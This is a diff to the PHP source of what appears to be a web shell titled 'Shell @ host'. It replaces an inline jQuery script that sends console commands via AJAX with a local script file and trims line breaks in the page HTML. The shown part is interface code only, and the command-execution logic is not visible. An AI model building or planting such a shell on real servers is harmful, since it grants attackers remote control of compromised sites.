@@ -1211,35 +1211,7 @@ DATA;
 		}
 
 		$sCurrentUrl = Request::getCurrentUrl();
-		$sScript = <<<DATA
-<script src="http://code.jquery.com/jquery-1.6.3.min.js"></script>
-<script>
-$(function()
-	{
-		$( 'div#body' ).after( '<div id="status">&nbsp;</div>' );
-		$( 'div#status' ).hide();
-
-		$( 'form' ).submit( function()
-			{
-				var sCmd = $( 'input#cmd' ).val();
-
-				if( ( $( 'input#cmd-send[value="Execute"]' ).length > 0 ) && ( sCmd.substring( 0, 5 ) != ':edit' ) && ( sCmd.substring( 0, 7 ) != ':upload' ) )
-				{
-					$( 'div#status' ).fadeIn( 250 );
-					$.post( '{$sCurrentUrl}', $( 'form' ).serialize(), function( sData )
-						{
-							$( 'pre#console' ).html( sData );
-							$( 'div#status' ).fadeOut( 250 );
-						}
-					);
-					return false;
-				}
-			}
-		);
-	}
-);
-</script>
-DATA;
+		$sScript = file_get_contents( 'Lib/jQuery.js' );
 
 		/**
 		 * Wylaczenie JavaScript
@@ -1254,8 +1226,8 @@ DATA;
 		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
 		$sVersion = self::VERSION;
 return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style>{$sScript}</head><body>
-<div id=\"body\">\r\n" .
-( $bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>\r\n" : NULL ) .
+<div id=\"body\">" .
+( $bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : NULL ) .
 "<div id=\"content\">{$sData}</div></div>" .
 ( $bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL ) .
 "</div></body></html>";
